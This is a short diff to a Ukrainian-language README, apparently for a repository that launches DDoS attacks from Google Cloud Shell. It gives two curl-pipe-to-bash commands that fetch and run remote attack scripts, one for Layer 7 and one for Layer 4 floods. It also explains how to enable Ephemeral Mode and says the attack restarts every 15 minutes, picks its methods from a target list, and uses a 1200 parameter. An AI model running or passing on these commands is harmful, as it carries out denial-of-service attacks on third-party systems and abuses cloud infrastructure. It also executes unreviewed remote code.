@@ -7,13 +7,15 @@ Making script for durable cloudshell session
 Команди для запуску атаки
 
 по Layer7:
+
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L7m.sh | bash
 
 по Layer4:
+
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L4.sh | bash
-
+#
 У GCloudShell https://shell.cloud.google.com/?fromcloudshell=true&show=terminal вмикаємо Ephemeral Mode (ставимо - "Завжди")
-
+#
 Налаштовано: перезапуск скрипту кожні 15 хв, метод атаки додається зі списку цілей, параметр -t вказано 1200
 
 #
